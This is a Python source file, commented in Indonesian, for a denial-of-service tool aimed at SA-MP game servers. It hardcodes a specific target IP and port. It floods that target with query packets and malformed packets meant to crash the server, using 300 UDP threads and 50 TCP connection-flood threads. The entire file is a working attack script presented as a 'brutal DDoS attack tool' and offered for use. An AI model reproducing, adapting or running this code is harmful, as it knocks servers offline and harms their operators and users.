import socket
import threading
import time
import random
import struct
from datetime import datetime

class SAMPServerDestroyer:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = True
        self.packets_sent = 0
        self.threads_active = 0
        self.start_time = datetime.now()
        
    def create_samp_packets(self):
        """Generate berbagai tipe SAMP query packets untuk maximum damage"""
        packets = []
        
        # SAMP header
        ip_parts = self.target_ip.split('.')
        ip_bytes = bytes([int(x) for x in ip_parts])
        port_bytes = struct.pack('H', self.target_port)
        
        # Packet 'i' - Info query (paling berat untuk server)
        info_packet = b'SAMP' + ip_bytes + port_bytes + b'i'
        packets.append(info_packet)
        
        # Packet 'c' - Client list (sangat resource-intensive)
        client_packet = b'SAMP' + ip_bytes + port_bytes + b'c'
        packets.append(client_packet)
        
        # Packet 'r' - Rules query (memakan banyak CPU)
        rules_packet = b'SAMP' + ip_bytes + port_bytes + b'r'
        packets.append(rules_packet)
        
        # Packet 'd' - Detailed player info
        detail_packet = b'SAMP' + ip_bytes + port_bytes + b'd'
        packets.append(detail_packet)
        
        # Packet 'p' - Ping flood
        for i in range(5):
            ping_data = struct.pack('I', random.randint(0, 0xFFFFFFFF))
            ping_packet = b'SAMP' + ip_bytes + port_bytes + b'p' + ping_data
            packets.append(ping_packet)
        
        # Malformed packets untuk crash server
        for i in range(3):
            malformed = b'SAMP' + ip_bytes + port_bytes + bytes([random.randint(0, 255)]) + b'\x00' * random.randint(10, 100)
            packets.append(malformed)
        
        return packets
    
    def udp_flood_worker(self, thread_id):
        """Worker thread untuk UDP flood attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packets = self.create_samp_packets()
        local_counter = 0
        
        print(f"[Thread {thread_id}] Started - Target: {self.target_ip}:{self.target_port}")
        
        while self.running:
            try:
                # Kirim semua tipe packets dalam burst
                for packet in packets:
                    # Kirim 50x per packet type untuk maximum throughput
                    for _ in range(50):
                        sock.sendto(packet, (self.target_ip, self.target_port))
                        local_counter += 1
                        self.packets_sent += 1
                
                # Update stats setiap 10000 packets
                if local_counter % 10000 == 0:
                    elapsed = (datetime.now() - self.start_time).total_seconds()
                    pps = self.packets_sent / elapsed if elapsed > 0 else 0
                    print(f"[Thread {thread_id}] Packets: {local_counter:,} | Total: {self.packets_sent:,} | PPS: {pps:,.0f}")
                    
            except Exception as e:
                pass
        
        sock.close()
        print(f"[Thread {thread_id}] Stopped. Total packets: {local_counter:,}")
    
    def tcp_syn_flood_worker(self, thread_id):
        """Worker untuk TCP SYN flood (alternative attack vector)"""
        print(f"[TCP-Thread {thread_id}] Started SYN flood")
        local_counter = 0
        
        while self.running:
            try:
                # Create new socket setiap iterasi untuk SYN flood
                for _ in range(100):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.01)
                        sock.connect_ex((self.target_ip, self.target_port))
                        sock.close()
                        local_counter += 1
                    except:
                        pass
                        
            except Exception as e:
                pass
        
        print(f"[TCP-Thread {thread_id}] Stopped. Total connections: {local_counter:,}")
    
    def stats_monitor(self):
        """Monitor dan display statistics real-time"""
        while self.running:
            time.sleep(5)
            elapsed = (datetime.now() - self.start_time).total_seconds()
            pps = self.packets_sent / elapsed if elapsed > 0 else 0
            
            print("\n" + "="*70)
            print(f"TARGET: {self.target_ip}:{self.target_port}")
            print(f"UPTIME: {int(elapsed)} detik")
            print(f"TOTAL PACKETS: {self.packets_sent:,}")
            print(f"PACKETS/SECOND: {pps:,.0f}")
            print(f"THREADS ACTIVE: {self.threads_active}")
            print("="*70 + "\n")
    
    def start_attack(self, udp_threads=300, tcp_threads=50):
        """Mulai serangan dengan multiple threads"""
        print("\n" + "="*70)
        print("  SAMP SERVER BRUTAL DDOS ATTACK")
        print("="*70)
        print(f"Target IP: {self.target_ip}")
        print(f"Target Port: {self.target_port}")
        print(f"UDP Threads: {udp_threads}")
        print(f"TCP Threads: {tcp_threads}")
        print(f"Total Threads: {udp_threads + tcp_threads}")
        print("="*70)
        print("\n[*] Memulai serangan dalam 3 detik...")
        time.sleep(3)
        
        threads = []
        
        # Start stats monitor
        stats_thread = threading.Thread(target=self.stats_monitor, daemon=True)
        stats_thread.start()
        
        # Launch UDP flood threads
        print(f"[*] Launching {udp_threads} UDP flood threads...")
        for i in range(udp_threads):
            t = threading.Thread(target=self.udp_flood_worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
            self.threads_active += 1
            time.sleep(0.01)  # Small delay untuk stabilitas
        
        # Launch TCP SYN flood threads
        print(f"[*] Launching {tcp_threads} TCP SYN flood threads...")
        for i in range(tcp_threads):
            t = threading.Thread(target=self.tcp_syn_flood_worker, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
            self.threads_active += 1
            time.sleep(0.01)
        
        print(f"\n[!!!] SERANGAN AKTIF [!!!]")
        print(f"[*] {self.threads_active} threads sedang membombardir target")
        print(f"[*] Tekan Ctrl+C untuk menghentikan serangan\n")
        
        # Keep running sampai user stop
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Menghentikan serangan...")
            self.running = False
        
        # Wait threads selesai
        print("[*] Menunggu semua threads berhenti...")
        time.sleep(2)
        
        # Final stats
        elapsed = (datetime.now() - self.start_time).total_seconds()
        print("\n" + "="*70)
        print("  SERANGAN SELESAI")
        print("="*70)
        print(f"Durasi: {int(elapsed)} detik ({int(elapsed/60)} menit)")
        print(f"Total Packets Terkirim: {self.packets_sent:,}")
        print(f"Average PPS: {self.packets_sent/elapsed:,.0f}")
        print("="*70)


if __name__ == "__main__":
    TARGET_IP = "104.234.180.137"
    TARGET_PORT = 7777
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║          SAMP SERVER BRUTAL DDOS ATTACK TOOL                 ║
║                  EXTREME EDITION 2026                        ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    print(f"\nTarget yang akan diserang:")
    print(f"  IP: {TARGET_IP}")
    print(f"  Port: {TARGET_PORT}")
    print(f"\n[!] Server target akan diserang dengan 350 threads")
    print(f"[!] Tekan Ctrl+C kapanpun untuk stop serangan")
    
    attacker = SAMPServerDestroyer(TARGET_IP, TARGET_PORT)
    attacker.start_attack(udp_threads=300, tcp_threads=50)
